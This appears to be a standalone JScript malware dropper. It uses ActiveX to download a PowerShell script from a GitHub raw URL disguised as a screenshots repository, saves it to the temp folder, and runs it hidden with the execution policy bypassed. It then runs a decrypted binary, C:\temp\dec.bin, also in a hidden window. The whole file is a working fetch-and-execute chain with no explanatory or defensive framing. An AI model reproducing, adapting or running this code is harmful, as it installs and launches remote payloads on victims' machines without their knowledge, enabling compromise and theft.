var x=new ActiveXObject("MSXML2.XMLHTTP");
x.open("GET","https://raw.githubusercontent.com/cem324/screenshots/main/y1.ps1",0);
x.send();
var fso=new ActiveXObject("Scripting.FileSystemObject");
var t=fso.GetSpecialFolder(2)+"\\y.ps1";
fso.CreateTextFile(t).Write(x.responseText);
var sh=new ActiveXObject("WScript.Shell");
sh.Run("powershell -ExecutionPolicy Bypass -File \""+t+"\"",0);
// Wait for decryption to complete
for(var i=0;i<30;i++){try{if(fso.FileExists("C:\\temp\\dec.bin")){break;}}catch(e){}}
// Execute decrypted file
sh.Run("C:\\temp\\dec.bin",0);
